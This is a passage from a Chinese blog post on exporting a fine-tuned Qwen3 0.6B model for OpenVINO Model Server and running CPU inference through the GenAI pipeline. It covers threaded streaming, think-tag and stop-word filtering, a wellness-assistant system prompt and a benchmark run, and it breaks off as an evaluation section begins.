<p>在 OVMS 方案中我们使用 SDK 导出 IR 模型时其实是有缺失的情况出现的。这次我们使用官方推荐的导出方式 export_model.py。我在 Github 中找到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Ftree%2Fmain%2Fdemos%2Fcommon%2Fexport_models" target="_blank" title="https://github.com/openvinotoolkit/model_server/tree/main/demos/common/export_models" ref="nofollow noopener noreferrer">openvinotoolkit</a> 项目，并下载 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Fblob%2Fmain%2Fdemos%2Fcommon%2Fexport_models%2Fexport_model.py" target="_blank" title="https://github.com/openvinotoolkit/model_server/blob/main/demos/common/export_models/export_model.py" ref="nofollow noopener noreferrer">export_model.py</a> 和 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenvinotoolkit%2Fmodel_server%2Fblob%2Fmain%2Fdemos%2Fcommon%2Fexport_models%2Frequirements.txt" target="_blank" title="https://github.com/openvinotoolkit/model_server/blob/main/demos/common/export_models/requirements.txt" ref="nofollow noopener noreferrer">requirements.txt</a> 两个文件。下载下来后先安装 requirements.txt ，然后在 step2_export_openvino_model.py 中加入 export_model.py 导出的适配代码，如下图：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">export_with_ovms_script</span>(<span class="hljs-params">self</span>):
    <span class="hljs-comment"># 读取 requirements.txt 文件并进行安装</span>
    export_script_path = self.install_ovms_depend()

    <span class="hljs-comment"># 设置 config.json 文件的导出路径</span>
    config_path = os.path.join(self.openvino_model, <span class="hljs-string">'config_all.json'</span>)
    
    <span class="hljs-comment"># 构建结构化的 OVMS 导出脚本</span>
    cmd = [
        sys.executable, export_script_path,
        <span class="hljs-string">'text_generation'</span>,
        <span class="hljs-string">'--source_model'</span>, self.unsloth_merge_model_dir,
        <span class="hljs-string">'--model_repository_path'</span>, self.openvino_ovms_model_dir,
        <span class="hljs-string">'--model_name'</span>, self.model_name,
        <span class="hljs-string">'--weight-format'</span>, self.weight_format,
        <span class="hljs-string">'--target_device'</span>, self.target_device,
        <span class="hljs-string">'--config_file_path'</span>, config_path,
        <span class="hljs-string">'--cache_size'</span>, <span class="hljs-built_in">str</span>(self.cache_size),
        <span class="hljs-string">'--max_num_seqs'</span>, <span class="hljs-built_in">str</span>(self.max_num_seqs),
        <span class="hljs-string">'--max_num_batched_tokens'</span>, <span class="hljs-built_in">str</span>(self.max_num_batched_tokens),
        <span class="hljs-string">'--reasoning_parser'</span>, self.reasoning_parser,
        <span class="hljs-string">'--extra_quantization_params'</span>, <span class="hljs-string">'--sym --group-size 128'</span>
    ]
    
    <span class="hljs-comment"># 根据 enable_prefix_caching 配置决定是否加上 --enable_prefix_caching 参数</span>
    <span class="hljs-keyword">if</span> self.enable_prefix_caching:
        cmd.append(<span class="hljs-string">'--enable_prefix_caching'</span>)
    
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># 运行导出</span>
            result = subprocess.run(cmd, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)
            <span class="hljs-comment"># 如果出现 warning 和 error 就进行输出</span>
            <span class="hljs-keyword">if</span> result.stderr:
                logger.warning(<span class="hljs-string">f"OVMS export stderr: <span class="hljs-subst">{result.stderr}</span>"</span>)
            
            <span class="hljs-comment"># 设置导出状态为 True</span>
            self.ovms_exported = <span class="hljs-literal">True</span>
            logger.info(<span class="hljs-string">"OVMS export completed successfully"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>导出后的文件目录如下：</p>
<pre><code class="hljs language-bash" lang="bash">OVMS
`-- qwen3-reasoning
    |-- added_tokens.json
    |-- chat_template.jinja
    |-- config.json
    |-- generation_config.json
    |-- graph.pbtxt
    |-- merges.txt
    |-- openvino_detokenizer.bin
    |-- openvino_detokenizer.xml
    |-- openvino_model.bin
    |-- openvino_model.xml
    |-- openvino_tokenizer.bin
    |-- openvino_tokenizer.xml
    |-- special_tokens_map.json
    |-- tokenizer.json
    |-- tokenizer_config.json
    `-- vocab.json
</code></pre>
<p>但是...</p>
<p>如果直接使用官方提供的 export_model.py 脚本导出是会出现报错的。如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdd8329dcb96410685f0023ae29ca0b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=yIKLPOgsyLuAan1HqAmhsdc236k%3D" alt="" loading="lazy"/></p>
<p>让我们来对照一下 export_model.py 源码和 huggingface 的说明文档。通过上面报错我们可以定位到导出语句：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fdb2620b59447399157caf71c59acab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=cQ96VWKnLzFlXn41aZf5eEUHBb4%3D" alt="" loading="lazy"/></p>
<p>可以看到在 export_model.py 中导出依然采用的是 optimum-cli export。而关于 optimum-cli export 我们早已在 huggingface 中看过：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhf-mirror.com%2Fdocs%2Foptimum-intel%2Fopenvino%2Fexport" target="_blank" title="https://hf-mirror.com/docs/optimum-intel/openvino/export" ref="nofollow noopener noreferrer">hf-mirror.com/docs/optimu…</a></p>
<pre><code class="hljs language-bash" lang="bash">usage: optimum-cli <span class="hljs-built_in">export</span> openvino [-h] -m MODEL [--task TASK] [--framework {pt}] [--trust-remote-code]
                                   [--weight-format {fp32,fp16,int8,int4,mxfp4,nf4,cb4}]
                                   [--quant-mode {int8,f8e4m3,f8e5m2,cb4_f8e4m3,int4_f8e4m3,int4_f8e5m2}]
                                   [--library {transformers,diffusers,timm,sentence_transformers,open_clip}]
                                   [--cache_dir CACHE_DIR] [--pad-token-id PAD_TOKEN_ID] [--ratio RATIO] [--sym]
                                   [--group-size GROUP_SIZE] [--backup-precision {none,int8_sym,int8_asym}]
                                   [--dataset DATASET] [--all-layers] [--awq] [--scale-estimation] [--gptq]
                                   [--lora-correction] [--sensitivity-metric SENSITIVITY_METRIC]
                                   [--quantization-statistics-path QUANTIZATION_STATISTICS_PATH]
                                   [--num-samples NUM_SAMPLES] [--disable-stateful] [--disable-convert-tokenizer]
                                   [--smooth-quant-alpha SMOOTH_QUANT_ALPHA]
                                   output

optional arguments:
  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>
...
</code></pre>
<p>通过对比发现在 export_model.py 中缺少了 --task 参数，这样的话 optimum-cli export 是无法知道你要导出的是什么类型的。为此，我们还需要修改一下 export_model.py 源码。如下图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85343044cdd14ddeb3e80da0d3d88a81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgS2lkYeeahOi6uuW5s-Wwj-Wxiw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765509763&amp;x-signature=i1YyI1LHZp8ZrGg02zYV6sEXqEY%3D" alt="" loading="lazy"/></p>
<p>这样才能够正常导出。</p>
<h4 data-id="heading-5">2.2 GenAI 推理</h4>
<p>模型导出后我们将使用 GenAI 管道的方式加载模型并实现推理。</p>
<p>整体代码我全部写在 step3_openvino_runtime.py 脚本中了，各位感兴趣可以自行 Checkout 下来阅读。在这里我只说代码中几个重点实现。</p>
<h5 data-id="heading-6">2.2.1. 线程、队列与生成器（异步流式处理模式）</h5>
<p>代码中采用了 Python 异步 I/O 密集型任务的经典模式：<strong>生产者-消费者模型。</strong></p>
<p>通过 threading.Lock 确保 OpenVINO 推理过程是互斥的。blocking=False 实现了<strong>非阻塞</strong>的系统繁忙检测：当有任务正在运行时，新请求会被快速拒绝（返回 "系统繁忙"），而不是排队阻塞，这极大地提高了服务的响应速度和稳定性。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">transfor_stream_msg</span>(<span class="hljs-params">
        self,
        msg: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>]]],
        **kwargs
    </span>) -&gt; Generator[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]:
    
    <span class="hljs-comment"># 检查是否线程繁忙</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> OpenvinoRuntime._inference_lock.acquire(blocking=<span class="hljs-literal">False</span>):
        logger.warning(<span class="hljs-string">"Inference request denied: System is busy."</span>)
        <span class="hljs-keyword">yield</span> {<span class="hljs-string">"content"</span>: <span class="hljs-string">"系统繁忙，请稍后再试，CPU资源已被占用。"</span>,<span class="hljs-string">"finished"</span>: <span class="hljs-literal">True</span>,<span class="hljs-string">"stop_reason"</span>: <span class="hljs-string">"busy_lock"</span>}
        <span class="hljs-keyword">return</span>

    <span class="hljs-keyword">try</span>:
            prompt = self._build_prompt(msg)
            early_stop_cfg = self.config[<span class="hljs-string">"early_stop"</span>]
            timeout = kwargs.get(<span class="hljs-string">"timeout_seconds"</span>, early_stop_cfg[<span class="hljs-string">"timeout_seconds"</span>])

            <span class="hljs-comment"># 初始化生产者</span>
            token_queue: Queue = Queue()
            streamer = ChunkingStreamer(
                token_queue=token_queue,
                stop_strings=self.stop_strings,
                timeout_seconds=timeout,
                chunk_size=<span class="hljs-number">15</span>, 
            )
</code></pre>
<p>而 Queue.Queue 是生产者（后台推理线程）和消费者（主生成器线程）之间的数据通道。它在线程安全的环境下缓存生成的 Subword，解耦了推理速度与消费速度。</p>
<p>将耗时的 self.pipe.generate(...) 放在一个独立的后台线程 run_generation 中运行。这使得主线程能够立即从队列中消费数据并 yield，避免了阻塞，实现了真正的异步流式输出。</p>
<pre><code class="hljs language-python" lang="python">...
    <span class="hljs-comment"># 初始化错误数组用于存放生成错误</span>
    generation_error = [<span class="hljs-literal">None</span>]
    
    <span class="hljs-comment"># 持续推理函数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run_generation</span>():
        <span class="hljs-keyword">try</span>:
            
            <span class="hljs-comment"># GenAI 管道推理</span>
            self.pipe.generate(prompt, gen_config, streamer)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            generation_error[<span class="hljs-number">0</span>] = e
            logger.error(<span class="hljs-string">f"Generation error: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">finally</span>:
            streamer.end()

    <span class="hljs-comment"># 独立线程运行</span>
    gen_thread = threading.Thread(target=run_generation, daemon=<span class="hljs-literal">True</span>)
    gen_thread.start()

...
</code></pre>
<h5 data-id="heading-7">2.2.2. 模型定制与高效停止机制</h5>
<p>针对康养、大健康、药食同源做了严格的提示词约束。</p>
<pre><code class="hljs language-python" lang="python">SYSTEM_PROMPT_TCM = <span class="hljs-string">"""
        你是康养问答助手。

        【强制规则】
        1. 只用中文回答，禁止英文
        2. 禁止使用任何符号：' " ` * # @ $ % ^ &amp; ( ) [ ] { } &lt; &gt; / \ | ~
        3. 标点只用：，。、！？
        4. 回答完毕输出【EOA】后立即停止

        【输出格式】
        【证型】具体证型名称
        【调理】分点建议
        【EOA】

        【举例】
        问题：经常头晕乏力，脸色发白
        回答：
        【证型】气血两虚证
        【调理】一、饮食方面，多吃红枣、桂圆、枸杞煮粥，每周炖一次乌鸡汤或猪肝汤补血
            二、作息方面，晚上十一点前入睡，午休半小时
            三、运动方面，每天散步二十分钟，不宜剧烈运动
        【EOA】
        
        注意：禁止输出英文单词。禁止输出特殊符号。
        """</span>
</code></pre>
<p>在提示词中强制要求回答结束后输出 【EOA】，并将其加入 stop_strings。模型一旦生成此标记，ChunkingStreamer 会立即切断生成，避免了不必要的 token 生成和计算浪费。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenvinoRuntime</span>:

    ...

    DEFAULT_CONFIG = {
       ...

        <span class="hljs-comment"># 停止关键字</span>
        <span class="hljs-string">"stop_strings"</span>: [
            <span class="hljs-string">"&lt;|im_end|&gt;"</span>,
            <span class="hljs-string">"&lt;|endoftext|&gt;"</span>,
            <span class="hljs-string">"&lt;|im_start|&gt;"</span>,
            <span class="hljs-string">"\n\n\n"</span>,
            <span class="hljs-string">"【EOA】"</span>,
            <span class="hljs-string">"\nUser:"</span>,
            <span class="hljs-string">"\nuser:"</span>,
            <span class="hljs-string">"Human:"</span>,
            <span class="hljs-string">"Assistant:"</span>,
        ]
    }
    ...

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ChunkingStreamer</span>:
    
    ...

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_stop_and_trim</span>(<span class="hljs-params">self, stop_str: <span class="hljs-built_in">str</span>, last_subword: <span class="hljs-built_in">str</span></span>):
        
        <span class="hljs-comment"># 获取完整分段字符串</span>
        full_check_string = self.buffer + last_subword

        <span class="hljs-comment"># 字符串中查找词停关键字并获取位置</span>
        stop_pos = full_check_string.find(stop_str)
        <span class="hljs-keyword">if</span> stop_pos != -<span class="hljs-number">1</span>:
            
            <span class="hljs-comment"># 定位到字符串词停为止并获取在此之前的全部字符串内容</span>
            content_to_send = full_check_string[:stop_pos]
            <span class="hljs-keyword">if</span> content_to_send:
                
                <span class="hljs-comment"># 将需要返回的字符串放入数据通道</span>
                self.token_queue.put(content_to_send)
                
            <span class="hljs-comment"># 更新字符缓存区和获取内容</span>
            current_buffer_len = <span class="hljs-built_in">len</span>(self.buffer)
            self.generated_text = self.generated_text[:<span class="hljs-built_in">len</span>(self.generated_text) - current_buffer_len] + content_to_send
            self.buffer = <span class="hljs-string">""</span>
        
        <span class="hljs-comment"># 停止继续输出</span>
        self._request_stop(<span class="hljs-string">f"stop_string: <span class="hljs-subst">{stop_str}</span>"</span>)

</code></pre>
<h5 data-id="heading-8">2.2.3. ChunkingStreamer 的三重防御与平滑输出</h5>
<p>上面已经浅浅提到了 ChunkingStreamer，其实 ChunkingStreamer 实现流式体验和数据清洗的核心模块，它同时处理了过滤、缓冲和停止。</p>
<p><em><strong>2.2.3.1 关于  标签的过滤</strong></em></p>
<p>在 <strong>call</strong> 方法内，通过一个 while 循环实现状态机</p>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, subword: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-comment"># 先检查是否已处于停止信号已发送状态，若是则中断输出</span>
        <span class="hljs-keyword">if</span> self.stop_requested.is_set():
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        
        <span class="hljs-comment"># 检查输出是否超时，超时则中断输出</span>
        <span class="hljs-keyword">if</span> time.time() - self.start_time &gt; self.timeout_seconds:
            self._flush_buffer_and_stop(<span class="hljs-string">"timeout"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># 将输出词赋值给 processed_subword</span>
        processed_subword = subword
        
        <span class="hljs-comment"># 状态机设置</span>
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            <span class="hljs-keyword">if</span> self.in_thought_mode:
                
                <span class="hljs-comment"># 寻找&lt;/think&gt;标签</span>
                end_pos = processed_subword.find(THINK_END_TAG)
                <span class="hljs-keyword">if</span> end_pos == -<span class="hljs-number">1</span>:
                    <span class="hljs-comment"># 找不到返回 False</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-comment"># 找到了就退出思考模式</span>
                    self.in_thought_mode = <span class="hljs-literal">False</span>
                    processed_subword = processed_subword[end_pos + <span class="hljs-built_in">len</span>(THINK_END_TAG):]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> processed_subword: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># 找&lt;think&gt;标签</span>
                start_pos = processed_subword.find(THINK_START_TAG)
                <span class="hljs-comment"># 若没有找到则不用找了直接跳出状态机</span>
                <span class="hljs-keyword">if</span> start_pos == -<span class="hljs-number">1</span>:
                    <span class="hljs-keyword">break</span>
                <span class="hljs-keyword">else</span>:
                    <span class="hljs-comment"># 找到的话就开始设值</span>
                    safe_content = processed_subword[:start_pos]
                    <span class="hljs-keyword">if</span> safe_content:
                        self.buffer += safe_content
                        self.generated_text += safe_content
                        self.token_count += <span class="hljs-number">1</span>

                    self.in_thought_mode = <span class="hljs-literal">True</span>
                    processed_subword = processed_subword[start_pos + <span class="hljs-built_in">len</span>(THINK_START_TAG):]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> processed_subword: <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        
        <span class="hljs-comment"># 检查输出词是否具有词停关键字</span>
        temp_text = self.buffer + processed_subword
        <span class="hljs-keyword">for</span> stop_str <span class="hljs-keyword">in</span> self.stop_strings:
            <span class="hljs-keyword">if</span> stop_str <span class="hljs-keyword">in</span> temp_text:
                self._stop_and_trim(stop_str, processed_subword.strip())
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

        <span class="hljs-comment"># 经过了以上检查后，没有问题了就可以将输出词放入缓冲区</span>
        self.buffer += processed_subword
        self.generated_text += processed_subword
        self.token_count += <span class="hljs-number">1</span>

        <span class="hljs-comment"># 如果缓冲区内字符大于预设置</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.buffer) &gt;= self.chunk_size:
            <span class="hljs-comment"># 找到最后一个缓冲的词</span>
            split_pos = -<span class="hljs-number">1</span>
            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> self.punctuation:
                pos = self.buffer.rfind(p)
                <span class="hljs-keyword">if</span> pos &gt; split_pos:
                    split_pos = pos

            <span class="hljs-comment"># 将所有缓存区的内容发送到数据通道</span>
            content_to_send = <span class="hljs-string">""</span>
            <span class="hljs-keyword">if</span> split_pos != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(self.buffer) - (split_pos + <span class="hljs-number">1</span>) &lt; self.chunk_size:
                content_to_send = self.buffer[:split_pos + <span class="hljs-number">1</span>]
                self.buffer = self.buffer[split_pos + <span class="hljs-number">1</span>:]
            <span class="hljs-keyword">else</span>:
                content_to_send = self.buffer[:self.chunk_size]
                self.buffer = self.buffer[self.chunk_size:]
            self.token_queue.put(content_to_send)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<p>当检测到  标签时进行状态切换，并丢弃标签内所有内容，直到检测到  标签结束。这实现了对思考内容的实时、零延迟拦截。</p>
<p>此外，代码中还提供两层额外保障：</p>
<ol>
<li>队列消费端 token.replace(THINK_END_TAG, '')，确保  标签不残留在流中。</li>
<li>get_clean_texts 中使用 re.sub(r'.*?', '', text, flags=re.DOTALL)，作为对最终完整输出的终极清理，捕获并移除任何意外残留的完整思考内容。</li>
</ol>
<pre><code class="hljs language-python" lang="python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_clean_texts</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:
        text = self.generated_text
        <span class="hljs-comment"># 删除残留的 &lt;think&gt; 标签</span>
        text = re.sub(<span class="hljs-string">r'&lt;think&gt;.*?&lt;/think&gt;'</span>, <span class="hljs-string">''</span>, text, flags=re.DOTALL)
        <span class="hljs-comment"># 删除词停关键字</span>
        <span class="hljs-keyword">for</span> stop_str <span class="hljs-keyword">in</span> self.stop_strings:
            text = re.sub(re.escape(stop_str), <span class="hljs-string">''</span>, text, flags=re.I)
        text = re.sub(<span class="hljs-string">r'\n{3,}'</span>, <span class="hljs-string">'\n\n'</span>, text)
        <span class="hljs-keyword">return</span> text.strip()
</code></pre>
<p><em><strong>2.2.3.2 强制分块与语义平滑</strong></em></p>
<p>为了更好地检测到【EOA】终止符，强制设定了每次向队列发送数据的最小字符数。即使模型输出速度很快，内容也会被强制按 15 个字符左右的批次释放。然后就能够基于这 15 个字符一次性检测是否具有【EOA】终止符，若存在则终止输出。（这个也是小模型最麻烦的地方，输出不会“刹车”。不得已才采取这种实现方案）</p>
<p>此外，当 buffer 达到 chunk_size 后，代码会优先在缓冲区中寻找最近的标点符号 (。, ！, ？, ；, \n) 进行切分。这确保了输出的平滑性同时，尽量避免在句子中间硬性截断，提升了用户阅读体验。</p>
<p><em><strong>2.2.3.3 停止词检测与精确切除</strong></em></p>
<p>还记得上面展示过的 _stop_and_trim 函数吗？当检测到 stop_str（如 【EOA】）时，该方法会计算停止词的精确位置 (stop_pos)。它只将停止词之前的内容 (full_check_string[:stop_pos]) 发送到队列，并立即设置停止标志，确保停止词本身和其后的任何多余内容都不会进入最终输出，实现了干净的自停止。</p>
<h5 data-id="heading-9">2.2.4. 推理性能</h5>
<p>好了，现在就可以正式测试一下推理效果了，为此我编写了一个测试代码</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:

    logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    logger.info(<span class="hljs-string">"Qwen3 0.6B OpenVINO Runtime 推理测试"</span>)
    logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)

    <span class="hljs-comment"># 为了跟 Optimum Intel 套件进行完整的对比，这里用回之前的提示词</span>
    input_prompt = <span class="hljs-string">"中医药理论是否能解释并解决全身乏力伴随心跳过速的症状？"</span>

    <span class="hljs-comment"># 计算 tokens 数</span>
    enc = tiktoken.get_encoding(<span class="hljs-string">"cl100k_base"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 获取 runtime 实例</span>
        llm = OpenvinoRuntime()
        logger.info(<span class="hljs-string">f"提示词: <span class="hljs-subst">{input_prompt}</span>"</span>)
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        full_response = <span class="hljs-string">""</span>
        token_count = <span class="hljs-number">0</span>
        start_time = time.time()
        
        <span class="hljs-comment"># 流式输出获取内容</span>
        <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> llm.transfor_stream_msg(input_prompt):
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk[<span class="hljs-string">"finished"</span>]:
                <span class="hljs-built_in">print</span>(chunk[<span class="hljs-string">"content"</span>], end=<span class="hljs-string">""</span>, flush=<span class="hljs-literal">True</span>)
                full_response += chunk[<span class="hljs-string">"content"</span>]
                token_count += <span class="hljs-built_in">len</span>(enc.encode(chunk[<span class="hljs-string">"content"</span>]))
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">if</span> <span class="hljs-string">'full_response'</span> <span class="hljs-keyword">in</span> chunk:
                    final_text = chunk[<span class="hljs-string">'full_response'</span>]
                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> full_response:
                        <span class="hljs-built_in">print</span>(final_text)
                        token_count += <span class="hljs-built_in">len</span>(enc.encode(final_text))
        
        <span class="hljs-comment"># 记录结束时间进行耗时计算</span>
        end_time = time.time()
        duration = end_time - start_time
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
        logger.info(<span class="hljs-string">f"总用时: <span class="hljs-subst">{duration:<span class="hljs-number">.2</span>f}</span> 秒"</span>)
        logger.info(<span class="hljs-string">f"总生成 token 数: <span class="hljs-subst">{token_count}</span>"</span>)
        <span class="hljs-keyword">if</span> duration &gt; <span class="hljs-number">0</span>:
            logger.info(<span class="hljs-string">f"生成速率: <span class="hljs-subst">{token_count/duration:<span class="hljs-number">.2</span>f}</span> token/秒"</span>)
        logger.info(<span class="hljs-string">"="</span> * <span class="hljs-number">60</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"主程序运行失败: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p>输出的结果如下：</p>
<pre><code class="hljs language-python" lang="python">...
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - Qwen3 <span class="hljs-number">0.6</span>B OpenVINO Runtime 推理测试
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span>,<span class="hljs-number">828</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">49</span>,027]_init_components - Loading model <span class="hljs-keyword">from</span> /Users/yuanzhenhui/Documents/document_file/tmp/trained_models/<span class="hljs-number">20251119</span>/OpenVINOModel/OVMS/qwen3-reasoning on CPU...
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]_init_components - Model loaded successfully (Mock)
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]_setup_generation_config - Generation config: do_sample=<span class="hljs-literal">False</span>, rep_penalty=<span class="hljs-number">1.2000000476837158</span>, max_tokens=<span class="hljs-number">300</span>
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]__init__ - OpenvinoRuntime initialized successfully
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]&lt;module&gt; - 提示词: 中医药理论是否能解释并解决全身乏力伴随心跳过速的症状？
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">53</span>,040]&lt;module&gt; - ============================================================
从整体来看，全身性疲劳与心率加快在中医学上可以归结为“气虚血弱”或“阳气不足”的表现。这通常需要通过调整身体内环境来恢复平衡。推荐使用如黄芪、当归等补气养血药物进行治疗，并结合饮食调养（例如多食用含铁质的食物）以及适当运动以增强体质。同时，在专业医生指导下进行个性化管理及监测，确保安全有效。请勿自行用药。[注] 中医强调个体差异性和复杂系统作用机制，请具体诊断需由有经验的专业医疗人员完成。[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - ============================================================
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - 总用时: <span class="hljs-number">6.67</span> 秒
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">713</span>]&lt;module&gt; - 总生成 token 数: <span class="hljs-number">228</span>
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">714</span>]&lt;module&gt; - 生成速率: <span class="hljs-number">34.17</span> token/秒
[<span class="hljs-number">2025</span>-<span class="hljs-number">12</span>-02 <span class="hljs-number">11</span>:<span class="hljs-number">53</span>:<span class="hljs-number">59</span>,<span class="hljs-number">714</span>]&lt;module&gt; - ============================================================
</code></pre>
<p>与之前的 Optimum Intel 方案和 Llama.cpp 方案相比，GenAI 在性能上有明显的提升。本机 2 GHz 四核Intel Core i5 CPU 能有 34.17 token/秒是之前未曾尝试过的。若迁移到生产的 Linux 服务器稍微再调优一下应该能够满足一般前置推理要求。</p>
<h3 data-id="heading-10">3.问答验证</h3>
<p>既然已经完成了基于 CPU 的推理部署工作了，接下来时候验证推理的准确性了。</p>
<p>虽然 Unsloth 训练时用 1% 的数据进行验证，但这毕竟是基于数学层面的验证。在中文的语义语法上、表达上是否清晰、不含歧义...这只能够实际模拟一下才知道。但我并不是行业专家无法就推理结果进行判断，这个时候就需要商用大模型帮我完成这个判断、评估、打分的工作了。</p>
<h4 data-id="heading-11">3.1 生成问题</h4>
<p>有看过我博客的小伙伴又知道了，我之前曾经使用过 RAGChecker 为之前公司的推理应用做过评估。这次的验证也可以参考 RAGChecker 的处理流程，只不过为了“零投入”，使用“人工收集 + Python 数据处理脚本 + 多次分批处理 + 商用大模型”的模式进行处理：</p>
